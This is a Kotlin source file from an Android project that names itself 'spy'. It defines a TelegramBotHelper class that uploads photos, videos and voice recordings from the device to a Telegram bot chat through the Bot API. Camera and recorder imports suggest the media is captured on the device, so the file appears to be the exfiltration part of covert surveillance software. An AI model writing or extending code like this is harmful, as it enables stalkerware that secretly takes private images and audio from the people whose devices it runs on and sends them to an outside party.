package com.spy.tz

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import okio.IOException // Ensure this import is present for Kotlin's Okio IOException if needed, but usually java.io.IOException is used with Callback
import org.json.JSONObject
import java.io.File
import java.io.IOException as JavaIOException // Alias to avoid conflict if needed
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class TelegramBotHelper(private val context: Context) {
    companion object {
        private const val TAG = "SpyTZ_Bot"
        private const val BASE_URL = "https://api.telegram.org"
    }

    fun sendPhotoToBot(botToken: String, chatId: String, filePath: String, caption: String = "") {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        
        // Use addFormDataPart for files
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("caption", caption)
            .addFormDataPart("photo", file.name, 
                RequestBody.create(MediaType.parse("image/jpeg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendPhoto")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Photo upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d(TAG, "Photo uploaded successfully")
                } else {
                    Log.e(TAG, "Error: ${response.code} ${response.message}")
                }
                response.close()
            }
        })
    }

    fun sendVideoToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        
        // Use addFormDataPart for files
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("video", file.name, 
                RequestBody.create(MediaType.parse("video/mp4"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVideo")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Video upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d(TAG, "Video uploaded successfully")
                } else {
                    Log.e(TAG, "Error: ${response.code} ${response.message}")
                }
                response.close()
            }
        })
    }

    fun sendAudioToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        
        // Use addFormDataPart for files
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("voice", file.name, 
                RequestBody.create(MediaType.parse("audio/ogg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVoice")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.e(TAG, "Audio upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.d(TAG, "Audio uploaded successfully")
                } else {
                    Log.e(TAG, "Error: ${response.code} ${response.message}")
                }
                response.close()
            }
        })
    }
}
